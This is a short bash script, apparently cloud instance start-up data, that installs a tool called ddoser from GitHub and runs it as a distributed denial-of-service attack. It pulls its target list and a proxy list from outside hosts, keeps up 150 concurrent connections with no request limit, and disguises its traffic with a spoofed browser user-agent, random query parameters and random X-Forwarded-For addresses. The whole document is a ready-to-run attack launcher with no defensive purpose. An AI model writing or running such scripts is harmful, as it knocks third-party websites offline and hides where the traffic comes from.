#!/bin/bash
set -x 
sudo systemctl start amazon-ssm-agent
sudo shutdown +15
yum install -y python3-pip git
ulimit -n 100000
git clone https://github.com/taransergey/ddoser.git
cd ddoser/
pip3 install -r requirements.txt
python3 ./ddoser.py --concurrency 150 --timeout 60 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --target-urls-file https://raw.githubusercontent.com/maxindahouze/reactor/main/targets3.txt --proxy-url 'http://143.244.166.15/proxy.list' --restart-period 600 --random-xff-ip